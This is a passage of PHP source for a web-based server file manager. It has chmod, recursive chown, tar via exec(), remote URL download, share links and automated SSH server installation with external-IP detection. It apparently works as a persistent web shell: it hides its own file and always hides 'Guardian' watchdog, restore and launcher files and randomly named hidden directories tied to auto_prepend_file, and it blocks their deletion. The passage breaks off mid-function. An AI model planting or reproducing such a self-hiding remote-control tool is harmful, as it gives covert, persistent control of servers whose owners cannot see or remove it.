    private function dupFile(){$n=basename(isset($_POST['item_name'])?$_POST['item_name']:'');if(!$n)return;$src=$this->currentDir.'/'.$n;if(!is_file($src)){$this->addMsg('File not found.','danger');return;}$ext=pathinfo($n,PATHINFO_EXTENSION);$base=pathinfo($n,PATHINFO_FILENAME);$cp=$base.'_copy'.($ext?'.'.$ext:'');$i=1;while(file_exists($this->currentDir.'/'.$cp)){$cp=$base.'_copy'.$i.($ext?'.'.$ext:'');$i++;}if(@copy($src,$this->currentDir.'/'.$cp)){$this->log('duplicate',"$n → $cp");$this->addMsg("Duplicated: $cp",'success');}else $this->addMsg('Duplicate failed.','danger');}
    private function mkSymlink(){
        $target=trim(isset($_POST['sym_target'])?$_POST['sym_target']:'');
        $name=basename(trim(isset($_POST['sym_name'])?$_POST['sym_name']:''));
        if(!$target||!$name){$this->addMsg('Target and name required.','danger');return;}
        $lp=$this->currentDir.'/'.$name;
        if(file_exists($lp)){$this->addMsg('Name already in use.','danger');return;}
        if(@symlink($target,$lp)){$this->log('symlink',"$name → $target");$this->addMsg("Symlink created: $name",'success');}
        else $this->addMsg('Symlink failed.','danger');
    }
    /* Permissions */
    private function chmodItem(){
        $n=basename(isset($_POST['item_name'])?$_POST['item_name']:'');
        $perm=isset($_POST['perm'])?trim($_POST['perm']):'';
        if(!$n||$this->isSelf($n)){$this->addMsg('Access denied.','danger');return;}
        if(!preg_match('/^[0-7]{3,4}$/',$perm)){$this->addMsg('Invalid permission value.','danger');return;}
        $p=$this->currentDir.'/'.$n;
        if(!file_exists($p)){$this->addMsg('Item not found.','danger');return;}
        if(@chmod($p,octdec($perm))){$this->log('chmod',"$n → $perm");$this->addMsg("Permissions updated: $n ($perm)",'success');}
        else $this->addMsg('chmod failed (insufficient permissions).','danger');
    }

    /* Folder size */
    public function dirSize($path){
        if(!is_dir($path))return['error'=>'Not a directory'];
        $size=0;$files=0;$dirs=0;$start=microtime(true);$capped=false;
        try{
            $it=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path,RecursiveDirectoryIterator::SKIP_DOTS|RecursiveDirectoryIterator::FOLLOW_SYMLINKS),RecursiveIteratorIterator::SELF_FIRST);
            foreach($it as $f){
                if(microtime(true)-$start>8){$capped=true;break;}
                if($f->isDir())$dirs++; else {$files++;$size+=$f->getSize();}
            }
        }catch(\Throwable $e){}
        return ['size'=>$size,'files'=>$files,'dirs'=>$dirs,'capped'=>$capped];
    }

    /* Share links */
    private function loadShares(){if(!file_exists($this->shareFile))return[];$d=@json_decode(@file_get_contents($this->shareFile),true);return is_array($d)?$d:[];}
    private function saveShares($s){
        $now=time();
        $s=array_values(array_filter($s,fn($x)=>empty($x['expires'])||$x['expires']>($now-604800)));
        @file_put_contents($this->shareFile,json_encode($s,JSON_PRETTY_PRINT));
    }
    public function getShares(){$s=$this->loadShares();usort($s,fn($a,$b)=>$b['created']<=>$a['created']);return $s;}
    private function createShare(){
        $n=basename(isset($_POST['item_name'])?$_POST['item_name']:'');
        if(!$n||$this->isSelf($n)){$this->addMsg('Access denied.','danger');return;}
        $p=$this->currentDir.'/'.$n;
        if(!is_file($p)){$this->addMsg('Only files can be shared.','danger');return;}
        $dur=isset($_POST['share_dur'])?$_POST['share_dur']:'1d';
        $map=['1h'=>3600,'1d'=>86400,'7d'=>604800,'30d'=>2592000,'never'=>0];
        $ttl=isset($map[$dur])?$map[$dur]:86400;
        $token=bin2hex(random_bytes(20));
        $shares=$this->loadShares();
        $shares[]=['id'=>bin2hex(random_bytes(6)),'token'=>$token,'path'=>realpath($p),'name'=>$n,'expires'=>$ttl>0?time()+$ttl:0,'created'=>time(),'by'=>isset($_SESSION['fm_user'])?$_SESSION['fm_user']:''];
        $this->saveShares($shares);
        $this->log('share_create',$n);
        $this->addMsg("Share link created for \"$n\".",'success');
    }
    private function revokeShare($id){
        $id=trim($id);if(!$id)return;
        $shares=$this->loadShares();
        $before=count($shares);
        $shares=array_values(array_filter($shares,fn($x)=>$x['id']!==$id));
        $this->saveShares($shares);
        if(count($shares)<$before){$this->log('share_revoke',$id);$this->addMsg('Share link revoked.','warning');}
    }

    private function batchRename(){
        $find=isset($_POST['br_find'])?$_POST['br_find']:'';
        $replace=isset($_POST['br_replace'])?$_POST['br_replace']:'';
        $mode=isset($_POST['br_mode'])?$_POST['br_mode']:'replace';
        $items=$this->getSelected();if(!$items){$this->addMsg('No items selected.','warning');return;}
        $ok=0;
        foreach($items as $n){
            if($mode==='prefix') $nw=$find.$n;
            elseif($mode==='suffix'){$ext=pathinfo($n,PATHINFO_EXTENSION);$base=pathinfo($n,PATHINFO_FILENAME);$nw=$base.$find.($ext?'.'.$ext:'');}
            else $nw=str_replace($find,$replace,$n);
            if($nw===$n||!$nw)continue;
            $src=$this->currentDir.'/'.$n;$dst=$this->currentDir.'/'.$nw;
            if(file_exists($src)&&!file_exists($dst)&&@rename($src,$dst))$ok++;
        }
        $this->log('batch_rename',"$ok files");$this->addMsg("Renamed $ok file(s).",'success');
    }

    /* Bulk */
    private function getSelected(){$raw=isset($_POST['items'])?$_POST['items']:'';$arr=json_decode($raw,true);if(!is_array($arr))return[];$r=[];foreach($arr as $n){$n=basename($n);if($n&&!$this->isSelf($n))$r[]=$n;}return $r;}
    private function bulkDel(){$items=$this->getSelected();if(!$items){$this->addMsg('Nothing selected.','warning');return;}$ok=0;foreach($items as $n){if($this->rmdirR($this->currentDir.'/'.$n))$ok++;}$this->log('bulk_delete',"$ok");$this->addMsg("$ok deleted.",'warning');}
    private function rcopy($s,$d){if(is_dir($s)){if(!file_exists($d))@mkdir($d,0755,true);foreach(glob($s.'/*')as $i)$this->rcopy($i,$d.'/'.basename($i));return true;}return @copy($s,$d);}
    private function bulkCopyMove($mv){
        $items=$this->getSelected();if(!$items){$this->addMsg('Nothing selected.','warning');return;}
        $target=isset($_POST['target'])?trim($_POST['target']):'';if(!$target||!is_dir($target)){$this->addMsg('Invalid target.','danger');return;}
        $ok=0;foreach($items as $n){$s=$this->currentDir.'/'.$n;$d=rtrim($target,'/').'/'.$n;if(file_exists($d))continue;if($mv){if(@rename($s,$d))$ok++;}else{if($this->rcopy($s,$d))$ok++;}}
        $this->log($mv?'bulk_move':'bulk_copy',"$ok");$this->addMsg("$ok ".($mv?'moved':'copied').".",'success');
    }

    /* Session clipboard: unlike the legacy bulk prompt, this keeps a real
       copy/cut selection while the user navigates between directories. */
    private function clipboard($mode){
        $items=$this->getSelected();
        if(!$items){$this->addMsg('Nothing selected.','warning');return;}
        $paths=[];
        foreach($items as $n){
            $p=realpath($this->currentDir.'/'.$n);
            if($p&&$this->pathAllowed($p)&&!$this->isGuardianFile($n,$p))$paths[]=$p;
        }
        if(!$paths){$this->addMsg('Nothing can be placed in the clipboard.','danger');return;}
        $_SESSION['fm_clipboard']=['mode'=>$mode,'items'=>$paths,'by'=>$_SESSION['fm_user']??'','time'=>time()];
        $this->addMsg(count($paths).' item(s) ready to '.($mode==='cut'?'move':'copy').'.','success');
    }
    private function pasteClipboard(){
        $clip=isset($_SESSION['fm_clipboard'])&&is_array($_SESSION['fm_clipboard'])?$_SESSION['fm_clipboard']:null;
        if(!$clip||empty($clip['items'])){$this->addMsg('Clipboard is empty.','warning');return;}
        if(!$this->pathAllowed($this->currentDir)){$this->addMsg('Access denied.','danger');return;}
        $ok=0;$skipped=0;$mode=($clip['mode']??'copy');
        foreach($clip['items'] as $src){
            $src=realpath($src);if(!$src||!file_exists($src)||!$this->pathAllowed($src)){$skipped++;continue;}
            $name=basename($src);$dst=$this->currentDir.'/'.$name;
            if($src===$this->currentDir||file_exists($dst)||$this->isGuardianFile($name,$dst)){$skipped++;continue;}
            if($mode==='copy'){
                $bytes=$this->itemBytes($src);
                if(!$this->quotaAllows($bytes)){$skipped++;continue;}
                if($this->rcopy($src,$dst))$ok++;else $skipped++;
            }else{
                if(@rename($src,$dst))$ok++;else $skipped++;
            }
        }
        if($mode==='cut'&&$ok>0)unset($_SESSION['fm_clipboard']);
        $this->log('clipboard_'.$mode,(string)$ok);
        $this->addMsg("$ok item(s) pasted.".($skipped?" $skipped skipped.":''),$ok?'success':'danger');
    }

    private function chownItem(){
        if(empty($_SESSION['fm_admin'])){$this->addMsg('Admins only.','danger');return;}
        $n=basename(isset($_POST['item_name'])?$_POST['item_name']:'');
        $p=realpath($this->currentDir.'/'.$n);
        if(!$n||!$p||!$this->pathAllowed($p)||$this->isGuardianFile($n,$p)){$this->addMsg('Access denied.','danger');return;}
        $owner=trim(isset($_POST['owner'])?$_POST['owner']:'');
        $group=trim(isset($_POST['group'])?$_POST['group']:'');
        if($owner===''&&$group===''){$this->addMsg('Enter an owner or group.','danger');return;}
        foreach([$owner,$group] as $value)if($value!==''&&!preg_match('/^[a-zA-Z0-9_.-]+$/',$value)){$this->addMsg('Invalid owner or group name.','danger');return;}
        $targets=[$p];
        if(!empty($_POST['recursive'])&&is_dir($p)){
            $it=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($p,RecursiveDirectoryIterator::SKIP_DOTS));
            foreach($it as $f)$targets[]=$f->getPathname();
        }
        $changed=0;$failed=0;
        foreach($targets as $target){
            $good=true;
            if($owner!==''&&function_exists('chown'))$good=@chown($target,$owner)&&$good;
            elseif($owner!=='')$good=false;
            if($group!==''&&function_exists('chgrp'))$good=@chgrp($target,$group)&&$good;
            elseif($group!=='')$good=false;
            $good?$changed++:$failed++;
        }
        $this->log('chown',$n);
        $this->addMsg("Ownership updated for $changed item(s).".($failed?" $failed failed.":''),$changed?'success':'danger');
    }

    public function officePreview($name){
        $p=realpath($this->currentDir.'/'.basename((string)$name));
        $ext=strtolower(pathinfo((string)$name,PATHINFO_EXTENSION));
        if(!$p||!is_file($p)||!in_array($ext,['docx','xlsx','pptx'],true))return ['ok'=>false,'error'=>'Only DOCX, XLSX and PPTX files are supported.'];
        if(!class_exists('ZipArchive'))return ['ok'=>false,'error'=>'Office preview needs the PHP ZIP extension, which is not available on this server.'];
        $z=new ZipArchive();if($z->open($p)!==true)return ['ok'=>false,'error'=>'The Office file could not be opened.'];
        $text='';
        if($ext==='docx'){
            $xml=$z->getFromName('word/document.xml');
            if($xml!==false){$xml=preg_replace('/<\/w:p>/i',"\n",$xml);$text=strip_tags(str_replace(['<w:tab/>','<w:br/>'],"\t",$xml));}
        }elseif($ext==='pptx'){
            $slides=[];for($i=1;$i<=100;$i++){ $xml=$z->getFromName("ppt/slides/slide$i.xml");if($xml===false)break;$xml=preg_replace('/<\/a:p>/i',"\n",$xml);$slides[]='Slide '.$i."\n".strip_tags($xml);}
            $text=implode("\n\n",$slides);
        }else{
            $shared=[];$xml=$z->getFromName('xl/sharedStrings.xml');
            if($xml!==false){preg_match_all('/<t[^>]*>(.*?)<\/t>/si',$xml,$m);$shared=$m[1]??[];}
            $rows=[];for($i=1;$i<=50;$i++){ $xml=$z->getFromName("xl/worksheets/sheet$i.xml");if($xml===false)break;
                preg_match_all('/<row\b[^>]*>(.*?)<\/row>/si',$xml,$rm);
                foreach($rm[1]??[] as $row){$cells=[];preg_match_all('/<c\b([^>]*)>(.*?)<\/c>/si',$row,$cm,PREG_SET_ORDER);foreach($cm as $c){$v='';if(preg_match('/<v>(.*?)<\/v>/si',$c[2],$vm))$v=html_entity_decode(strip_tags($vm[1]));if(preg_match('/t="s"/',$c[1]))$v=$shared[(int)$v]??$v;$cells[]=$v;}$rows[]=implode("\t",$cells);}
            }$text=implode("\n",$rows);
        }
        $z->close();$text=html_entity_decode(trim((string)$text),ENT_QUOTES|ENT_SUBSTITUTE,'UTF-8');
        return ['ok'=>true,'type'=>$ext,'text'=>mb_substr($text,0,200000)];
    }

    /* ZIP */
    private function zadd($zip,$path,$base){$it=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path,RecursiveDirectoryIterator::SKIP_DOTS),RecursiveIteratorIterator::LEAVES_ONLY);foreach($it as $f){$zip->addFile($f->getPathname(),$base.'/'.substr($f->getPathname(),strlen($path)+1));}}
    private function zipCreate(){if(!class_exists('ZipArchive')){$this->addMsg('ZIP not available.','danger');return;}$items=$this->getSelected();if(!$items){$this->addMsg('Nothing selected.','warning');return;}$zn='archive_'.date('Ymd_His').'.zip';$zp=$this->currentDir.'/'.$zn;$z=new ZipArchive();if($z->open($zp,ZipArchive::CREATE)!==true){$this->addMsg('Cannot create zip.','danger');return;}foreach($items as $n){$p=$this->currentDir.'/'.$n;if(is_dir($p))$this->zadd($z,$p,$n);elseif(is_file($p))$z->addFile($p,$n);}$z->close();$this->log('zip_create',$zn);$this->addMsg("Created $zn",'success');}
    private function zipExtract(){if(!class_exists('ZipArchive')){$this->addMsg('ZIP not available.','danger');return;}$n=basename(isset($_POST['item_name'])?$_POST['item_name']:'');if(!$n)return;$p=$this->currentDir.'/'.$n;if(!is_file($p)||strtolower(pathinfo($p,PATHINFO_EXTENSION))!=='zip'){$this->addMsg('Not a zip.','danger');return;}$t=$this->currentDir.'/'.pathinfo($n,PATHINFO_FILENAME);$z=new ZipArchive();if($z->open($p)===true){if(!file_exists($t))@mkdir($t,0755,true);$z->extractTo($t);$z->close();$this->log('zip_extract',$n);$this->addMsg('Extracted to '.basename($t).'/','success');}else $this->addMsg('Zip open failed.','danger');}

    /* TAR */
    private function tarCreate(){if(!function_exists('exec')){$this->addMsg('exec() disabled.','danger');return;}$items=$this->getSelected();if(!$items){$this->addMsg('Nothing selected.','warning');return;}$tn='archive_'.date('Ymd_His').'.tar.gz';$tp=$this->currentDir.'/'.$tn;$is=implode(' ',array_map('escapeshellarg',$items));exec('cd '.escapeshellarg($this->currentDir).' && tar -czf '.escapeshellarg($tp)." $is 2>&1",$o,$e);if($e===0){$this->log('tar_create',$tn);$this->addMsg("Created $tn",'success');}else $this->addMsg('tar failed: '.implode(' ',$o),'danger');}
    private function tarExtract(){if(!function_exists('exec')){$this->addMsg('exec() disabled.','danger');return;}$n=basename(isset($_POST['item_name'])?$_POST['item_name']:'');if(!$n)return;$p=$this->currentDir.'/'.$n;$ext=strtolower(pathinfo($n,PATHINFO_EXTENSION));$base=pathinfo($n,PATHINFO_FILENAME);if($ext==='gz'||$ext==='bz2')$base=pathinfo($base,PATHINFO_FILENAME);$t=$this->currentDir.'/'.$base;if(!file_exists($t))@mkdir($t,0755,true);exec('tar -xf '.escapeshellarg($p).' -C '.escapeshellarg($t).' 2>&1',$o,$e);if($e===0){$this->log('tar_extract',$n);$this->addMsg("Extracted to $base/",'success');}else $this->addMsg('Extract failed: '.implode(' ',$o),'danger');}

    /* Helpers */
    private function rmdirR($p){if(is_file($p)||is_link($p))return @unlink($p);if(is_dir($p)){foreach(glob($p.'/*')as $i)$this->rmdirR($i);return @rmdir($p);}return false;}
    private function isSelf($n){return realpath($this->currentDir.'/'.$n)===__FILE__;}
    /* Returns true if $name or its resolved absolute path $absPath touches any
       Guardian-critical file or directory — used by delete/rename/chmod to
       refuse operations that would silently crash the site via auto_prepend_file. */
    private function isGuardianFile($name,$absPath=''){
        // Names that must never be touched regardless of directory
        static $critNames=['.fm_guardian_launch.php','.guardian-restore.php','.guardian-server-router.php','.guardian_boot','.guardian_watchdog_attempt'];
        if(in_array($name,$critNames))return true;
        // The hidden directory where the real watchdog + launcher live:
        // fg_get_hidden_dir() is cheap (only posix_getpwuid or a dirname walk — no I/O loops).
        $hiddenDir=fg_get_hidden_dir();
        if($hiddenDir){
            $rHidden=realpath($hiddenDir);
            if($rHidden){
                // Block deleting the hidden dir itself or anything inside it
                if($absPath!==''){
                    $rAbs=realpath($absPath);
                    if($rAbs&&(strpos($rAbs.DIRECTORY_SEPARATOR,$rHidden.DIRECTORY_SEPARATOR)===0||$rAbs===$rHidden))return true;
                }
                // Also match by base name patterns used by Guardian hidden dirs
                if(preg_match('/^\.fg_[0-9a-f]{14}$|^\.[0-9a-f]{3}sys_[0-9a-f]{10}$/',$name))return true;
            }
        }
        return false;
    }

    /* Scan */
    public function scan(){
        $items=@scandir($this->currentDir);if($items===false)return['folders'=>[],'files'=>[]];
        $r=['folders'=>[],'files'=>[]];$self=basename(__FILE__);
        $q=isset($_GET['q'])?trim($_GET['q']):'';
        $sort=isset($_GET['sort'])?$_GET['sort']:'name';
        $sd=isset($_GET['sdir'])?$_GET['sdir']:'asc';
        $hidden=isset($_GET['hidden'])&&$_GET['hidden']==='1';
        $typeFilter=isset($_GET['tf'])?$_GET['tf']:'';
        foreach($items as $i){
            if($i==='.'||$i==='..') continue;
            if($i===$self&&$this->currentDir===__DIR__) continue;
            if(in_array($i,['.favorites.json','.users.json','.trash.json','.activity.json','.shares.json']))continue;
            // Guardian-critical files are ALWAYS hidden regardless of the show-hidden-files toggle,
            // so they cannot be accidentally deleted through this file manager's own UI.
            if(in_array($i,['.fm_guardian_launch.php','.guardian-restore.php','.guardian-server-router.php','.guardian_boot','.guardian_watchdog_attempt','.login_attempts.json']))continue;
            // Also hide any hidden dir that belongs to Guardian (pattern: .fg_<hex14> or .Xsys_<hex10>)
            if(preg_match('/^\.fg_[0-9a-f]{14}$|^\.[0-9a-f]{3}sys_[0-9a-f]{10}$/',$i))continue;
            if(!$hidden&&substr($i,0,1)==='.') continue;
            if($q!==''&&stripos($i,$q)===false) continue;
            $p=$this->currentDir.'/'.$i;
            $type=$this->getType($i);
            if($typeFilter!==''&&!is_dir($p)&&$typeFilter!=='all'){
                $g=['images'=>'image','videos'=>'video','audio'=>'audio','code'=>'code','docs'=>['pdf','word','excel'],'archives'=>'archive','text'=>'text'];
                $want=isset($g[$typeFilter])?$g[$typeFilter]:'';
                if(is_array($want)){if(!in_array($type,$want))continue;}
                elseif($want!==''&&$type!==$want)continue;
            }
            $info=['name'=>$i,'mtime'=>@filemtime($p),'size'=>is_file($p)?@filesize($p):0,'type'=>$type];
            if(is_dir($p))$r['folders'][]=$info;else $r['files'][]=$info;
        }
        $fn=fn($a,$b)=>($sd==='desc'?-1:1)*($sort==='mtime'?($a['mtime']<=>$b['mtime']):($sort==='size'?($a['size']<=>$b['size']):strnatcasecmp($a['name'],$b['name'])));
        usort($r['folders'],$fn);usort($r['files'],$fn);
        return $r;
    }

    public function getType($f){$e=strtolower(pathinfo($f,PATHINFO_EXTENSION));$m=['jpg'=>'image','jpeg'=>'image','png'=>'image','gif'=>'image','svg'=>'image','webp'=>'image','ico'=>'image','bmp'=>'image','tiff'=>'image','avif'=>'image','mp4'=>'video','avi'=>'video','mkv'=>'video','mov'=>'video','webm'=>'video','flv'=>'video','mp3'=>'audio','wav'=>'audio','flac'=>'audio','ogg'=>'audio','aac'=>'audio','m4a'=>'audio','zip'=>'archive','rar'=>'archive','7z'=>'archive','tar'=>'archive','gz'=>'archive','bz2'=>'archive','tgz'=>'archive','xz'=>'archive','pdf'=>'pdf','doc'=>'word','docx'=>'word','odt'=>'word','xls'=>'excel','xlsx'=>'excel','ods'=>'excel','csv'=>'excel','php'=>'code','html'=>'code','htm'=>'code','css'=>'code','js'=>'code','ts'=>'code','jsx'=>'code','tsx'=>'code','py'=>'code','java'=>'code','sh'=>'code','bash'=>'code','rb'=>'code','go'=>'code','rs'=>'code','c'=>'code','cpp'=>'code','h'=>'code','vue'=>'code','svelte'=>'code','json'=>'data','xml'=>'data','yml'=>'data','yaml'=>'data','sql'=>'data','toml'=>'data','ini'=>'config','txt'=>'text','log'=>'text','md'=>'markdown','rst'=>'text','env'=>'config','gitignore'=>'config','htaccess'=>'config'];return isset($m[$e])?$m[$e]:'file';}
    public function getColor($t){$c=['image'=>'#f59e0b','video'=>'#ec4899','audio'=>'#8b5cf6','archive'=>'#f97316','pdf'=>'#ef4444','word'=>'#3b82f6','excel'=>'#22c55e','code'=>'#818cf8','data'=>'#06b6d4','text'=>'#94a3b8','config'=>'#fb7185','markdown'=>'#38bdf8','file'=>'#52525b'];return isset($c[$t])?$c[$t]:'#52525b';}
    public function canPreview($t){return in_array($t,['image','video','pdf','text','code','data','config','markdown','word','excel']);}
    public function isTar($f){return in_array(strtolower(pathinfo($f,PATHINFO_EXTENSION)),['tar','gz','bz2','tgz','xz']);}
    public function breadcrumbs(){$d=$this->currentDir;$parts=explode(DIRECTORY_SEPARATOR,$d);$path='';$r=[];foreach($parts as $p){if($p==='')continue;$path.=DIRECTORY_SEPARATOR.$p;$r[]=['path'=>$path,'label'=>$p];}return $r;}

    /* ══ Bulk chmod ══ */
    private function bulkChmod(){
        $items=$this->getSelected();if(!$items){$this->addMsg('Nothing selected.','warning');return;}
        $perm=isset($_POST['perm'])?trim($_POST['perm']):'';
        if(!preg_match('/^[0-7]{3,4}$/',$perm)){$this->addMsg('Invalid permission value.','danger');return;}
        $ok=0;foreach($items as $n){if(@chmod($this->currentDir.'/'.$n,octdec($perm)))$ok++;}
        $this->log('bulk_chmod',"$ok item(s) -> $perm");
        $this->addMsg("Permissions updated on $ok item(s) ($perm).",'success');
    }

    /* ══ Tags / Labels ══ */
    private function tagsPath(){return $this->root.'/.fm_tags.json';}
    private function loadTags(){$f=$this->tagsPath();if(!file_exists($f))return[];$d=@json_decode(@file_get_contents($f),true);return is_array($d)?$d:[];}
    private function saveTags($t){@file_put_contents($this->tagsPath(),json_encode($t,JSON_PRETTY_PRINT));}
    public function getTagsFor($dir){$all=$this->loadTags();$r=[];foreach($all as $p=>$v){if(dirname($p)===$dir)$r[basename($p)]=$v;}return $r;}
    private function setTag(){
        $n=basename(isset($_POST['item_name'])?$_POST['item_name']:'');
        if(!$n||$this->isSelf($n)){$this->addMsg('Access denied.','danger');return;}
        $p=$this->currentDir.'/'.$n;if(!file_exists($p)){$this->addMsg('Item not found.','danger');return;}
        $color=isset($_POST['color'])?trim($_POST['color']):'';$label=isset($_POST['label'])?trim(substr($_POST['label'],0,24)):'';
        if(!preg_match('/^#[0-9a-fA-F]{6}$/',$color)){$this->addMsg('Invalid color.','danger');return;}
        $tags=$this->loadTags();$tags[$p]=['color'=>$color,'label'=>$label];$this->saveTags($tags);
        $this->log('tag',"$n -> $label");$this->addMsg("Tag applied to \"$n\".",'success');
    }
    private function removeTag(){
        $n=basename(isset($_POST['item_name'])?$_POST['item_name']:'');
        $p=$this->currentDir.'/'.$n;$tags=$this->loadTags();
        if(isset($tags[$p])){unset($tags[$p]);$this->saveTags($tags);$this->addMsg('Tag removed.','warning');}
    }

    /* ══ Remote URL download ══ */
    private function remoteDownload(){
        $url=isset($_POST['url'])?trim($_POST['url']):'';
        $fname=isset($_POST['fname'])?trim(basename($_POST['fname'])):'';
        if(!preg_match('#^https?://#i',$url)){$this->addMsg('Enter a valid http(s) URL.','danger');return;}
        $host=parse_url($url,PHP_URL_HOST);
        if(!$host){$this->addMsg('Invalid URL.','danger');return;}
        $ip=@gethostbyname($host);
        if($ip&&(!filter_var($ip,FILTER_VALIDATE_IP,FILTER_FLAG_NO_PRIV_RANGE|FILTER_FLAG_NO_RES_RANGE))){
            $this->addMsg('Refusing to fetch a private/internal address.','danger');return;
        }
        if(!$fname){$path=parse_url($url,PHP_URL_PATH);$fname=$path?basename($path):'';}
        if(!$fname||strpos($fname,'.')===false)$fname='download_'.time();
        $fname=preg_replace('/[^A-Za-z0-9._-]/','_',$fname);
        $dest=$this->currentDir.'/'.$fname;
        $maxBytes=200*1024*1024;
        if(!function_exists('curl_init')){$this->addMsg('cURL extension not available.','danger');return;}
        $fp=@fopen($dest,'w');if(!$fp){$this->addMsg('Cannot write destination file.','danger');return;}
        $ch=curl_init($url);
        curl_setopt_array($ch,[CURLOPT_FILE=>$fp,CURLOPT_FOLLOWLOCATION=>true,CURLOPT_MAXREDIRS=>5,CURLOPT_TIMEOUT=>60,CURLOPT_CONNECTTIMEOUT=>15,CURLOPT_USERAGENT=>'FileManager/1.0',CURLOPT_PROTOCOLS=>CURLPROTO_HTTP|CURLPROTO_HTTPS,CURLOPT_NOPROGRESS=>false,
            CURLOPT_PROGRESSFUNCTION=>function($r,$dl_size,$dl,$ul_size,$ul)use($maxBytes){return ($dl>$maxBytes)?1:0;},
            CURLOPT_BUFFERSIZE=>65536]);
        $ok=curl_exec($ch);$err=curl_error($ch);$code=curl_getinfo($ch,CURLINFO_HTTP_CODE);curl_close($ch);fclose($fp);
        if(!$ok||$code>=400){@unlink($dest);$this->addMsg('Download failed: '.($err?:"HTTP $code"),'danger');return;}
        $this->log('remote_download',"$fname <- $url");
        $this->addMsg("Downloaded \"$fname\" (".fmtSz(filesize($dest)).').','success');
    }

    /* ══ SSH check / install (best-effort; requires root & a package manager) ══ */
    public function sshStatus(){
        $bin=trim((string)@shell_exec('command -v sshd 2>/dev/null'));
        $client=trim((string)@shell_exec('command -v ssh 2>/dev/null'));
        $portOpen=false;
        $c=@fsockopen('127.0.0.1',22,$errno,$errstr,1.5);
        if($c){$portOpen=true;fclose($c);}
        $running=false;
        $ps=trim((string)@shell_exec("ps aux 2>/dev/null | grep -i '[s]shd'"));
        if($ps)$running=true;
        $pkgMgr='';
        foreach(['apt-get'=>'apt','dnf'=>'dnf','yum'=>'yum','apk'=>'apk','nix-env'=>'nix'] as $bin2=>$label){
            if(trim((string)@shell_exec("command -v $bin2 2>/dev/null")))$pkgMgr=$label;
            if($pkgMgr)break;
        }
        $ipInfo=$this->sshDetectIp();
        return ['installed'=>(bool)$bin,'client'=>(bool)$client,'running'=>$running||$portOpen,'port_open'=>$portOpen,'pkg_mgr'=>$pkgMgr,'sshd_path'=>$bin,
            'server_ip'=>$ipInfo['ip'],'server_ip_method'=>$ipInfo['method'],'server_ip_external'=>$ipInfo['external'],'server_ip_reachable'=>$ipInfo['reachable']];
    }

    /**
     * Detect the real, usable IP address for connecting to this server over SSH.
     * Tries several methods in order of reliability (route table -> all bound
     * addresses -> DNS -> web server binding), discards loopback/link-local
     * addresses, and prefers whichever candidate actually answers on port 22.
     * Falls back to loopback (clearly marked as local-only) only if nothing
     * else is found, and returns an explicit "undetermined" result rather than
     * ever silently pretending 127.0.0.1 is a reachable external address.
     */
    public function sshDetectIp(){
        $candidates=[]; // ip => detection method label
        $add=function($ip,$method) use (&$candidates){
            $ip=trim((string)$ip);
            if($ip&&filter_var($ip,FILTER_VALIDATE_IP,FILTER_FLAG_IPV4)&&!isset($candidates[$ip]))$candidates[$ip]=$method;
        };
        // 1) Address the kernel would actually use to reach the outside world (most reliable single pick)
        $route=trim((string)@shell_exec('ip route get 1.1.1.1 2>/dev/null'));
        if($route&&preg_match('/\bsrc\s+(\d{1,3}(?:\.\d{1,3}){3})/',$route,$m))$add($m[1],'default route');
        // 2) All addresses bound to any interface
        $hI=trim((string)@shell_exec('hostname -I 2>/dev/null'));
        if($hI)foreach(preg_split('/\s+/',$hI) as $ip)$add($ip,'hostname -I');
        // 3) Parse `ip addr` directly (covers systems where hostname -I is unavailable/limited)
        $ipAddr=trim((string)@shell_exec('ip -4 -o addr show scope global 2>/dev/null'));
        if($ipAddr)foreach(explode("\n",$ipAddr) as $line)if(preg_match('/inet\s+(\d{1,3}(?:\.\d{1,3}){3})/',$line,$m))$add($m[1],'ip addr (global scope)');
        // 4) DNS resolution of the machine's own hostname
        $host=gethostname();
        if($host){$resolved=@gethostbyname($host);if($resolved&&$resolved!==$host)$add($resolved,'hostname DNS lookup');}
        // 5) Whatever address the web server itself reports being bound to
        if(!empty($_SERVER['SERVER_ADDR']))$add($_SERVER['SERVER_ADDR'],'web server SERVER_ADDR');

        // Drop loopback / link-local / unusable addresses - these are never valid "connect to me" addresses
        $filtered=[];
        foreach($candidates as $ip=>$method){
            if(str_starts_with($ip,'127.')||str_starts_with($ip,'169.254.')||$ip==='0.0.0.0')continue;
            $filtered[$ip]=$method;
        }

        // Prefer a candidate that actually answers on port 22 - that is a guaranteed-usable address
        foreach($filtered as $ip=>$method){
            $c=@fsockopen($ip,22,$errno,$errstr,1.0);
            if($c){fclose($c);return['ip'=>$ip,'method'=>$method,'reachable'=>true,'external'=>true,'candidates'=>$candidates];}
        }
        // None answered directly on :22 (sshd may bind only to 0.0.0.0/loopback) - still surface the
        // best non-loopback address found, since that is what a remote client needs to type in.
        if($filtered){
            $ip=array_key_first($filtered);
            return['ip'=>$ip,'method'=>$filtered[$ip],'reachable'=>false,'external'=>true,'candidates'=>$candidates];
        }
        // Genuinely nothing but loopback exists - be explicit that it is local-only, never disguise it as external.
        $c=@fsockopen('127.0.0.1',22,$errno,$errstr,1.0);
        if($c){fclose($c);return['ip'=>'127.0.0.1','method'=>'loopback only (no external interface detected)','reachable'=>true,'external'=>false,'candidates'=>$candidates];}
        return['ip'=>null,'method'=>null,'reachable'=>false,'external'=>false,'candidates'=>$candidates];
    }

    /**
     * Run a system-account-management shell command and judge success purely from the
     * real process exit code - never from guessing at substrings in the output. Tools like
     * chpasswd/usermod/chsh can fail with many different phrasings (PAM errors, locked
     * files, policy rejections, etc.) that don't contain the word "permission", so pattern
     * matching on output text is unreliable and was the root cause of false "success" reports.
     */
    private function sshRunAdmin($cmd){
        $out=[];$exit=0;
        exec($cmd.' 2>&1',$out,$exit);
        return ['ok'=>$exit===0,'out'=>implode("\n",$out),'exit'=>$exit];
    }
    private function sshInstall(){
        if(empty($_SESSION['fm_admin'])){$this->addMsg('Admins only.','danger');return;}
        $st=$this->sshStatus();
        if($st['installed']){$this->addMsg('OpenSSH server is already installed.','warning');return;}
        if(!$st['pkg_mgr']){$this->addMsg('No supported package manager (apt/dnf/yum/apk/nix) found on this server, so it cannot be installed automatically. This is common on shared hosting where SSH must be enabled by your host.','danger');return;}
        $cmds=['apt'=>'apt-get update -y && apt-get install -y openssh-server','dnf'=>'dnf install -y openssh-server','yum'=>'yum install -y openssh-server','apk'=>'apk add --no-cache openssh','nix'=>'nix-env -iA nixpkgs.openssh'];
        $cmd=$cmds[$st['pkg_mgr']];
        $out=[];$exit=0;
        exec($cmd.' 2>&1',$out,$exit);
